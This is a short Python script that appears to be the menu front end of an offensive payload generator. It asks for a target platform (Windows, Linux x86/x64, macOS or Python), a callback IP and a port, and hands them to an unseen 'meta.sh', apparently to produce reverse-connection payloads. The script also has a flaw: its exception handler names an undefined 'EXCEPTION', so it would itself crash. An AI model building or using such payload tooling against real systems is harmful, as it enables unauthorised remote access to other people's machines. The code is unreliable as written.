#!/usr/bin/python3

import subprocess

BLACK = "\033[1;30m"
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"

print(f"\n\n\t\t {MAGENTA}PAYLOAD MENU\n\n")
print(f"{GREEN}1) Windows")
print(f"{GREEN}2) Linux(x86/x64)")
print(f"{GREEN}3) MAC OS")
print(f"{GREEN}4) Python Script\n\n")

ARCH = 0
OP = int(input(f"{GREEN}Enter option number: "))

print(f"\t{BLUE}Available Options\n")
IP = input(f"{RED}Enter IP: ")
PORT = input(f"{RED}Enter PORT: ")

try:
	if OP == 2:
		print(f"{GREEN}\n1) x86\n2) x64\n")
		ARCH = int(input(f"{RED}Architecture: "))
		print(f"\n{WHITE}[-] Please wait for few minutes...\n")
		subprocess.call(["./meta.sh", f"{IP}", f"{PORT}", f"{OP}", f"{ARCH}"])
		print(f"\n{GREEN}[-] Successful\n")
	else:
		print(f"\n{WHITE}[-] Please wait for few minutes...\n")
		subprocess.call(["./meta.sh", f"{IP}", f"{PORT}", f"{OP}"])
		print(f"\n{GREEN}[-] Successful\n")
except EXCEPTION:
	print(f"{RED}Error!")
